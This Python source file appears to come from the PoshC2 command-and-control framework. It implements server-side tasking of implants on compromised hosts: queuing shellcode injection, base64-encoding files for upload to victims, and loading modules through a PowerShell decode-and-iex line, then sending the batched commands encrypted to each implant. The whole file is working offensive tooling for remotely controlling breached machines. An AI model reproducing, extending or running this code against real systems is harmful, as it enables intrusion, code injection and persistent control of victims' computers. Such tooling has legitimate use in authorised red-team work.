from poshc2.Colours import Colours
from poshc2.server.Core import load_module, load_module_sharp, encrypt, default_response
import poshc2.server.database.DBSQLite as DB
import datetime, hashlib, base64, traceback


def newTask(path):
    result = DB.get_implants_all()
    commands = ""
    if result:
        for i in result:
            RandomURI = i[1]
            EncKey = i[5]
            tasks = DB.get_newtasks(RandomURI)
            if RandomURI in path and tasks:
                for a in tasks:
                    command = a[2]
                    user = a[3]
                    user_command = command
                    hostinfo = DB.get_hostinfo(RandomURI)
                    implant_type = DB.get_implanttype(RandomURI)
                    now = datetime.datetime.now()
                    if (command.lower().startswith("$shellcode64")) or (command.lower().startswith("$shellcode86") or command.lower().startswith("run-exe core.program core inject-shellcode")):
                        user_command = "Inject Shellcode: %s" % command[command.index("#") + 1:]
                        command = command[:command.index("#")]
                    elif (command.lower().startswith('upload-file')):
                        upload_args = command.lower().replace('upload-file', '')
                        upload_file = upload_args.split()[0]
                        upload_file_destination = upload_args.split()[1]
                        upload_args = upload_args.replace(upload_file, '')
                        upload_args = upload_args.replace(upload_file_destination, '')
                        with open(upload_file, "rb") as f:
                            upload_file_bytes = f.read()
                        if not upload_file_bytes:
                            print(Colours.RED + f"Error, no bytes read from the upload file, removing task: {upload_file}" + Colours.GREEN)
                            DB.del_newtasks(str(a[0]))
                            continue
                        upload_file_bytes_b64 = base64.b64encode(upload_file_bytes).decode("utf-8")
                        if implant_type.startswith('C#'):
                            command = f"upload-file {upload_file_bytes_b64};\"{upload_file_destination}\" {upload_args}"
                        elif implant_type.startswith('PS'):
                            command = f"Upload-File -Destination \"{upload_file_destination}\" -Base64 {upload_file_bytes_b64} {upload_args}"
                        elif implant_type.startswith('PY'):
                            command = f"upload-file \"{upload_file_destination}\":{upload_file_bytes_b64} {upload_args}"
                        else:
                            print(Colours.RED)
                            print("Error parsing upload command: %s" % upload_args)
                            print(Colours.GREEN)
                        filehash = hashlib.md5(base64.b64decode(upload_file_bytes_b64)).hexdigest()
                        user_command = f"Uploading file: {upload_file} to {upload_file_destination} with md5sum: {filehash}"
                    taskId = DB.insert_task(RandomURI, user_command, user)
                    taskIdStr = "0" * (5 - len(str(taskId))) + str(taskId)
                    if len(str(taskId)) > 5:
                        raise ValueError('Task ID is greater than 5 characters which is not supported.')
                    print(Colours.YELLOW)
                    if user is not None and user != "":
                        print("Task %s (%s) issued against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, user, hostinfo[0], hostinfo[11], hostinfo[2], hostinfo[3], now.strftime("%d/%m/%Y %H:%M:%S")))
                    else:
                        print("Task %s issued against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, hostinfo[0], hostinfo[11], hostinfo[2], hostinfo[3], now.strftime("%d/%m/%Y %H:%M:%S")))
                    try:
                        print(user_command)
                        print(Colours.END)
                    except Exception as e:
                        print("Cannot print output: %s" % e)
                    if a[2].startswith("loadmodule"):
                        try:
                            module_name = (a[2]).replace("loadmodule ", "")
                            if ".exe" in module_name:
                                modulestr = load_module_sharp(module_name)
                            elif ".dll" in module_name:
                                modulestr = load_module_sharp(module_name)
                            else:
                                modulestr = load_module(module_name)
                            command = "loadmodule%s" % modulestr
                        except Exception as e:
                            print("Cannot find module, loadmodule is case sensitive!")
                            print(e)
                    if a[2].startswith("pbind-loadmodule"):
                        try:
                            module_name = (a[2]).replace("pbind-loadmodule ", "")
                            if ".exe" in module_name:
                                modulestr = load_module_sharp(module_name)
                            elif ".dll" in module_name:
                                modulestr = load_module_sharp(module_name)
                            else:
                                modulestr = load_module(module_name)
                            command = "pbind-command \"`$mk = '%s';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$mk))|iex\"" % base64.b64encode(bytes(modulestr, "utf-8")).decode('utf-8')
                        except Exception as e:
                            print("Cannot find module, loadmodule is case sensitive!")
                            print(e)
                            traceback.print_exc()
                    command = taskIdStr + command
                    if commands:
                        commands += "!d-3dion@LD!-d" + command
                    else:
                        commands += command
                    DB.del_newtasks(str(a[0]))
                if commands is not None:
                    multicmd = "multicmd%s" % commands
                try:
                    responseVal = encrypt(EncKey, multicmd)
                except Exception as e:
                    responseVal = ""
                    print("Error encrypting value: %s" % e)
                now = datetime.datetime.now()
                DB.update_implant_lastseen(now.strftime("%d/%m/%Y %H:%M:%S"), RandomURI)
                return responseVal
            elif RandomURI in path and not tasks:
                # if there is no tasks but its a normal beacon send 200
                now = datetime.datetime.now()
                DB.update_implant_lastseen(now.strftime("%d/%m/%Y %H:%M:%S"), RandomURI)
                return default_response()
